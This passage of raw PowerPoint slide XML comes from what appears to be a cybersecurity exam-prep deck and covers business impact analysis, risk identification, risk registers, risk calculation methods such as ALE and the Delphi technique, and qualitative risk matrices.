              </a:rPr>
              <a:t>•  A SOC or security analyst relies on the BIA to prioritize which assets and services to protect and restore first, so incident response and resource allocation are aligned to what actually keeps the business running.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect scenario questions asking you to determine which system to recover or protect first based on maximum tolerable downtime and business criticality identified in a BIA.</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772</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · BUSINESS IMPACT ANALYSIS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Business Impact Analysis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Study of what’s important to a business and what critical functions must be sustained</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Considerations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Maximum tolerable downtime and disruption for activities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Operational disruption and productivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Financial considerations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Regulatory responsibilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Reputation</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773</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · BUSINESS IMPACT ANALYSIS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Business Impact Analysis Steps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A BIA follows a repeatable process that begins by selecting interviewees from all organizational levels, then choosing data-gathering techniques such as surveys, questionnaires, and both qualitative and quantitative approaches to collect consistent information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The analyst then identifies the company's critical business functions, the resources (people, systems, data, suppliers) those functions depend on, and calculates how long each function can survive without those resources.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Next the team identifies the vulnerabilities and threats to each critical function and calculates the resulting risk, so the most exposed functions are clearly ranked.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Finally the findings are documented and reported to management with recommendations, giving decision-makers the evidence to fund controls and set recovery priorities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions may present the BIA steps out of order or ask what happens at a specific stage, so know that resource-dependency and survival-time analysis precede risk calculation and the management report.</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774</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · BUSINESS IMPACT ANALYSIS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Business Impact Analysis Steps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Select individuals to interview for data gathering</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  People from all levels</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Create data-gathering techniques</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Surveys, questionnaires, and qualitative and quantitative approaches</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identify the company’s critical business functions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identify resources these functions depend on</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Calculate how long critical functions can survive without these resources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775</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · BUSINESS IMPACT ANALYSIS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Business Impact Analysis Steps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Identify vulnerabilities and threats to critical business functions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Calculate the risk for each critical business function</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Document findings, report them to management, make recommendations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776</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK IDENTIFICATION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Risk Identification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Risk identification is the phase of risk management whose main goals are to identify vulnerabilities, determine the probability that a threat will exploit each vulnerability, and estimate the potential business impact of each threat.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It also seeks an economic balance between the impact of a threat and the cost of the countermeasure, so an organization does not spend more defending an asset than the asset is worth.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts drive the work by asking the right questions: what event could occur (the threat event), what its potential impact would be (magnitude), how likely it is to happen (probability), and how confident they are in those answers (certainty).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a security analyst this framing turns vague concerns into structured, defensible inputs that support consistent prioritization and reporting to management.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests the four guiding questions—threat event, magnitude, probability, and certainty—and the principle that countermeasure cost should not exceed the value of the asset it protects.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777</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK IDENTIFICATION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Risk Identification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Main goals</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Identify vulnerabilities</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Determine probability that a threat will exploit a vulnerability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Determine potential business impact of each threat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Provide economic balance between impact of the threat and cost of the countermeasure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778</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK IDENTIFICATION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Risk Identification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Ask the right questions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What event could occur (threat event)?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What could be the potential impact (magnitude)?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  How likely is it to happen (probability)?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What level of confidence do we have in the answers to the first three questions (certainty)?</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779</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK IDENTIFICATION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Risk Identification Process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The risk identification process gathers risk inputs from multiple sources: evaluating cyber threat intelligence, conducting vulnerability assessments, observing day-to-day cybersecurity operations, and organizing brainstorming sessions with stakeholders.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Identified risks are captured in a risk register, the central document that tracks each risk throughout its lifecycle.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Each register entry typically records a unique identifier, a short name, a description, an assigned owner responsible for managing it, and a probability rating (often alongside impact).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst uses the risk register as a living, auditable record that keeps risks visible, assigns accountability, and drives follow-up and treatment decisions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Know the standard fields of a risk register (ID, name, description, owner, probability/impact) and recognize threat intel, vulnerability assessments, and brainstorming as valid risk-identification inputs.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780</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK IDENTIFICATION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Risk Identification Process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Evaluate cyber threat intelligence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Conduct vulnerability assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Observe cybersecurity operations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Organize brainstorming sessions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781</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK IDENTIFICATION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Risk Identification Process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Risk register</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Unique identifier</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Short name</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Description</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Owner</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Probability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Magnitude</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Risk value (or rating)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Disposition</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782</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Risk Calculation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Risk calculation quantifies or ranks identified risks using two complementary methods: qualitative analysis, which rates risk on descriptive scales like high/medium/low, and quantitative analysis, which assigns numeric values such as SLE, ARO, and ALE in monetary terms.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Whichever method is used, the risks that must be mitigated first are those with the highest probability of occurring combined with the highest magnitude of impact.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The Delphi technique supports qualitative estimation by having each participant anonymously list risks and anonymously comment, removing groupthink and dominant-personality bias so the consensus reflects independent expert judgment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because a defensible calculation determines where limited budget and effort go, and anonymity in Delphi produces more honest input than open discussion.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Distinguish qualitative (subjective scales) from quantitative (numeric/monetary, e.g. ALE = SLE × ARO) analysis, and recognize the Delphi technique by its anonymous, iterative expert consensus.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783</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Risk Calculation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Qualitative</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Quantitative</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Risks that must be mitigated first have:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Highest probability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Highest magnitude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784</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Risk Calculation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Delphi technique</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Each person anonymously lists risks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Each person anonymously comments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785</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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 · RISK CALCULATION AND COMMUNICATION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Qualitative Risk Matrix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A qualitative risk matrix (heat map) is a grid that plots each risk's likelihood on one axis against its impact on the other to produce an overall severity rating without exact numbers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The intersecting cells are usually color-coded—commonly green for low, yellow for moderate, and red for high or critical—so priorities are visible at a glance.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because it relies on descriptive ratings rather than dollar figures, the matrix is fast to build and easy for non-technical audiences to interpret.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Security analysts use it to communicate relative risk priority to management quickly and to justify which risks warrant immediate treatment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
